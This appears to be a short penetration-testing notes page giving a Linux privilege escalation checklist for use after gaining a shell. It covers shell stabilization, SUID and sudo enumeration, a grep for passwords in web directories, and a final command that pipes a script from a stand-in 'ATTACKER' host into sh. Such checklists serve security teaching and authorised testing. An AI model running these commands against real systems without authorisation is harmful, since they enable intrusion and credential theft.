---
title: "Linux Privilege Escalation Checklist"
description: "A compact order of operations for local Linux enumeration after getting a shell."
date: 2026-06-04
area: "Privilege Escalation"
tags: ["linux", "privesc", "sudo", "suid"]
---

## Stabilize

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 120
```

## First Checks

```bash
id
hostname
sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null | head
```

## Interesting Files

```bash
ls -la /home
ls -la /opt /var/www /srv
cat /etc/crontab
grep -R "password\\|passwd\\|pwd" /var/www 2>/dev/null
```

## Tools

Run automated tools only after manual basics, then verify findings yourself.

```bash
curl http://ATTACKER/linpeas.sh | sh
```
